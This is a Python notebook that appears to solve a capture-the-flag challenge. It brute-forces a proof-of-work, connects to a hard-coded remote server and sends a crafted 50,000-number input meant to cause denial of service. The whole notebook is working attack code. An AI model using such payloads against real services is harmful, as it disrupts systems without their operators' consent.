
# coding: utf-8

# In[1]:


#get_ipython().run_line_magic('env', 'TERMINFO=/usr/share/terminfo')
#get_ipython().run_line_magic('env', 'PWNLIB_NOTERM=true')
from pwn import *
import hashlib
import random
import itertools


# In[2]:


def solve(x):
    alphanumeric = string.uppercase+string.lowercase+string.digits
    for s in itertools.product(alphanumeric,repeat=6):
        tmp = hashlib.sha256(''.join(s)).hexdigest()[-6:]
        if tmp == x:
            return ''.join(s)


# In[3]:


con = remote("140.112.31.97", 10159)
print con.recv()
text = con.recv()
print text
x = text.split()[-1][:-1]
ans = solve(x)
con.send(ans.encode('hex')+'\n')
print con.recv()


# In[4]:


i = 29
j = 2**17
payload = ""
payload += '50000\n'
payload += str(j)+'\n'
for k in range(24999):
    j = (5*j+1)%(2**i)
    payload += str(j)+'\n'
for k in range(25000):
    payload += str(0)+'\n'


# In[5]:


con.send(payload)
print con.recv()
print con.recv()
print con.recv()


# In[90]:


f = open("dos.txt", "w")
f.write(payload)
f.close()

